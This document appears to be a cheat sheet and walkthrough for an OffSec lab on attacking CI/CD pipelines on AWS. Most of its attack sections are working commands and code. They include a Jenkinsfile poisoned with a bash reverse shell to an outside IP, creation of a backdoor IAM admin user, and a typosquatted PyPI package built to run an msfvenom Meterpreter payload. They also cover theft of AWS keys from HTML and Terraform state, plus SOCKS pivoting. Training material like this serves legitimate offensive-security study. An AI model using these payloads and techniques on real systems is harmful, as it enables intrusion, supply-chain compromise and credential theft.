# Attacking CI/CD Systems on AWS - Cheat Sheet & Walkthrough

## Table of Contents
1. [Leaked Secrets to Poisoned Pipeline](#1-leaked-secrets-to-poisoned-pipeline)
2. [Dependency Chain Abuse](#2-dependency-chain-abuse)
3. [Quick Reference](#3-quick-reference)

---

## 1. Leaked Secrets to Poisoned Pipeline

### 1.1 Lab Setup

#### Configure DNS
```bash
# List connections
nmcli connection

# Set DNS server
sudo nmcli connection modify "Wired connection 1" ipv4.dns "203.0.113.84"

# Restart NetworkManager
sudo systemctl restart NetworkManager

# Verify
cat /etc/resolv.conf
nslookup git.offseclab.io

# Reset DNS
sudo nmcli connection modify "Wired connection 1" ipv4.dns ""
sudo systemctl restart NetworkManager
```

#### Lab Components
| Component | Subdomain |
|-----------|-----------|
| Gitea (SCM) | git.offseclab.io |
| Jenkins | automation.offseclab.io |
| Application | app.offseclab.io |

### 1.2 Enumeration

#### Jenkins Enumeration
```bash
# Metasploit module
msfconsole
use auxiliary/scanner/http/jenkins_enum
set RHOSTS automation.offseclab.io
set TARGETURI /
run
```

**Key Finding**: Jenkins version 2.385

#### Git Server Enumeration
- Visit `http://git.offseclab.io`
- Check `Explore` → Users tab
- Found users: Billy, Jack, Lucy, Roger, administrator

#### Application Enumeration
```bash
# Directory enumeration
dirb http://app.offseclab.io

# S3 bucket discovery from HTML source
# Look for: https://staticcontent-XXXXX.s3.us-east-1.amazonaws.com/

# Try to list bucket
curl https://staticcontent-XXXXX.s3.us-east-1.amazonaws.com
# AccessDenied - but we can still enumerate
```

### 1.3 Discovering Secrets

#### Configure AWS CLI
```bash
aws configure
# Input: Access Key ID, Secret Access Key, us-east-1

# List S3 bucket
aws s3 ls staticcontent-lgudbhv8syu2tgbk

# Sync bucket locally
mkdir static_content
aws s3 sync s3://staticcontent-lgudbhv8syu2tgbk ./static_content/
```

#### Search Git History
```bash
# Install gitleaks
sudo apt install gitleaks

# Run detection
gitleaks detect

# Manual git review
git log
git show 64382765366943dd1270e945b0b23dbed3024340

# Decode base64 header
echo "YWRtaW5pc3RyYXRvcjo5bndrcWU1aGxiY21jOTFu" | base64 --decode
# Output: administrator:9nwkqe5hlbcmc91n
```

### 1.4 Poisoning the Pipeline

#### Jenkinsfile Structure
```groovy
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'bash -c "bash -i >& /dev/tcp/192.88.99.76/4242 0>&1" & '
            }
          }
        }
      }
    }
  }
}
```

#### Reverse Shell Payload
```bash
# Start listener on cloud Kali
nc -nvlp 4242

# In Jenkinsfile
sh 'bash -c "bash -i >& /dev/tcp/192.88.99.76/4242 0>&1" & '
```

### 1.5 Enumerating Builder

```bash
# OS info
uname -a
cat /etc/os-release

# Check mounts
cat /proc/mounts

# Check capabilities
cat /proc/1/status | grep Cap
capsh --decode=0000003fffffffff

# Environment variables
env | grep AWS
```

### 1.6 Creating Backdoor Account

```bash
# Configure new profile
aws configure --profile=CompromisedJenkins

# Get user info
aws --profile CompromisedJenkins sts get-caller-identity

# Create backdoor user
aws --profile CompromisedJenkins iam create-user --user-name backdoor

# Attach Admin policy
aws --profile CompromisedJenkins iam attach-user-policy \
    --user-name backdoor \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access keys
aws --profile CompromisedJenkins iam create-access-key --user-name backdoor

# Configure backdoor profile
aws configure --profile=backdoor
```

---

## 2. Dependency Chain Abuse

### 2.1 Lab Setup

#### Configure pip
```bash
mkdir -p ~/.config/pip/
nano ~/.config/pip/pip.conf

# Content:
[global]
index-url = http://pypi.offseclab.io
trusted-host = pypi.offseclab.io
```

### 2.2 Information Gathering

#### Application Enumeration
- Visit `app.offseclab.io`
- Explore API documentation
- Get API token
- Check Developer Tools → Network tab
- Discover Server: `Werkzeug/1.0.1 Python/3.11.2`

#### Open Source Intelligence
- Visit `http://forum.offseclab.io`
- Found post about `hackshort-util` package
- Import: `from hackshort_util import utils`
- Version requirement: `hackshort-util~=1.1.0`

### 2.3 Creating Malicious Package

#### Basic Package Structure
```
hackshort-util/
├── setup.py
└── hackshort_util/
    └── __init__.py
```

#### setup.py
```python
from setuptools import setup, find_packages
from setuptools.command.install import install

class Installer(install):
    def run(self):
        install.run(self)
        # Add payload here

setup(
    name='hackshort-util',
    version='1.1.4',
    packages=find_packages(),
    cmdclass={'install': Installer}
)
```

#### utils.py (Runtime Payload)
```python
import time
import sys

def standardFunction():
    pass

def __getattr__(name):
    return standardFunction

def catch_exception(exc_type, exc_value, tb):
    while True:
        time.sleep(1000)

sys.excepthook = catch_exception

# Meterpreter payload here
exec(__import__('zlib').decompress(...))
```

### 2.4 Generating Meterpreter Payload

```bash
# Generate payload
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.88.99.76 LPORT=4488

# Start listener
msfconsole
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4488
set ExitOnSession false
run -jz
```

### 2.5 Publishing Package

#### Configure ~/.pypirc
```ini
[distutils]
index-servers = 
    offseclab 

[offseclab]
repository: http://pypi.offseclab.io/
username: student
password: password
```

#### Build and Upload
```bash
# Build package
python3 ./setup.py sdist

# Upload
twine upload --repository-url http://pypi.offseclab.io/ -u student -p password dist/*
```

#### Cleanup Commands
```bash
# Remove package
curl -u "student:password" --form ":action=remove_pkg" \
     --form "name=hackshort_util" --form "version=1.1.4" \
     http://pypi.offseclab.io/

# Check uploaded packages
curl -u 'student:password' http://pypi.offseclab.io/hackshort-util/json
```

### 2.6 Post-Exploitation

#### Python Port Scanner
```python
import socket
import ipaddress
import sys

def port_scan(ip_range, ports):
    for ip in ip_range:
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(.2)
            result = sock.connect_ex((str(ip), port))
            if result == 0:
                print(f"Port {port} is open on {ip}")
            sock.close()

ip_range = ipaddress.IPv4Network(sys.argv[1], strict=False)
ports = [80, 443, 8080]
port_scan(ip_range, ports)
```

#### Setup SOCKS Proxy in Metasploit
```bash
meterpreter > background
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
run -j

# Add route
route add 172.30.0.1 255.255.0.0 2
```

#### SSH Tunnel
```bash
# Local port forward
ssh -fN -L localhost:1080:localhost:1080 kali@192.88.99.76
```

#### Firefox SOCKS Configuration
1. Settings → Network Settings
2. Manual proxy configuration
3. SOCKS Host: 127.0.0.1, Port: 1080
4. SOCKS v5

### 2.7 Jenkins Exploitation

#### Create Account
- Navigate to Jenkins via SOCKS proxy: `http://172.30.0.30:8080`
- Click "create an account"
- Register with credentials

#### Find S3 Explorer Plugin
- Navigate to project "company-dir"
- Click "S3 Explorer"
- View Source → Search for AWS credentials

**Hidden Inputs**:
```html
<input id="awsregion" type="hidden" value="us-east-1">
<input id="awsid" type="hidden" value="AKIAUBHUBEGIMWGUDSWQ">
<input id="awskey" type="hidden" value="e7pRWvsGgTyB8UHNXilvCZdC9xZPA8oF3KtUwaJ5">
<input id="bucket" type="hidden" value="company-directory-9b58rezp3vvkf90f">
```

### 2.8 Escalating to Admin

#### Configure AWS Profile
```bash
aws configure --profile=stolen-s3
# Input: Access Key ID, Secret Access Key, us-east-1

# Get identity
aws --profile=stolen-s3 sts get-caller-identity

# List buckets
aws --profile=stolen-s3 s3 ls

# List Terraform state bucket
aws --profile=stolen-s3 s3 ls tf-state-9b58rezp3vvkf90f

# Download state file
aws --profile=stolen-s3 s3 cp s3://tf-state-9b58rezp3vvkf90f/terraform.tfstate ./
```

#### Review Terraform State
```json
"user_list": {
  "value": [
    {
      "email": "Goran.Bregovic@offseclab.io",
      "name": "Goran.B",
      "policy": "arn:aws:iam::aws:policy/AdministratorAccess"
    }
  ]
}
```

```json
"attributes": {
  "id": "AKIAUBHUBEGIGZN3IP46",
  "secret": "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"
}
```

#### Use Admin Credentials
```bash
aws configure --profile=goran.b
aws --profile=goran.b iam list-attached-user-policies --user-name goran.b
```

---

## 3. Quick Reference

### OWASP CI/CD Security Risks
| ID | Risk |
|----|------|
| CICD-SEC-1 | Insufficient Flow Control Mechanisms |
| CICD-SEC-2 | Inadequate Identity and Access Management |
| CICD-SEC-3 | Dependency Chain Abuse |
| CICD-SEC-4 | Poisoned Pipeline Execution (PPE) |
| CICD-SEC-5 | Insufficient PBAC |
| CICD-SEC-6 | Insufficient Credential Hygiene |
| CICD-SEC-7 | Insecure System Configuration |
| CICD-SEC-8 | Ungoverned Usage of 3rd Party Services |
| CICD-SEC-9 | Improper Artifact Integrity Validation |
| CICD-SEC-10 | Insufficient Logging and Visibility |

### Key Commands Quick Reference

```bash
# DNS Setup
nmcli connection modify "Wired connection 1" ipv4.dns "203.0.113.84"
sudo systemctl restart NetworkManager

# AWS CLI
aws configure --profile=NAME
aws --profile=NAME s3 ls BUCKET_NAME
aws --profile=NAME s3 sync s3://BUCKET_NAME ./LOCAL/
aws --profile=NAME sts get-caller-identity

# Git
git log
git show COMMIT_HASH

# Pip
pip install ./dist/PACKAGE.tar.gz
pip uninstall PACKAGE_NAME

# Metasploit
msfconsole
use auxiliary/scanner/http/jenkins_enum
use exploit/multi/handler
use auxiliary/server/socks_proxy

# msfvenom
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=IP LPORT=PORT
```

### Key Takeaways

| Concept                     | Key Point                                     |
| --------------------------- | --------------------------------------------- |
| **Pipeline Poisoning**      | Modify Jenkinsfile to execute commands        |
| **Webhooks**                | Trigger pipeline on Git push                  |
| **Dependency Chain Attack** | Publish malicious package with higher version |
| **Jenkinsfile**             | `withAWS()` loads credentials                 |
| **S3 Explorer Plugin**      | Leaks AWS credentials in HTML source          |
| **Terraform State**         | Often contains admin credentials              |
| **SOCKS Proxy**             | Tunnel through compromised container          |